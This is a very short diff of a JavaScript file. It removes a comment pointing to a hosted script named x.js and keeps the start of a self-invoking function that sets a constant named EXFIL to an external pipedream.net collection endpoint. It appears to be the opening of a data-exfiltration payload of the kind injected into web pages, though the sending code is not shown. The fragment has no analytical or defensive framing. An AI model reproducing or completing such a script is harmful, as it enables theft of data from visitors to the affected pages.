@@ -1,4 +1,3 @@
-// https://secnge.github.io/propas/x.js
 (function() {
     var EXFIL = 'https://6b884da34ac52d711d2d20ef6f2bf068.m.pipedream.net';
 
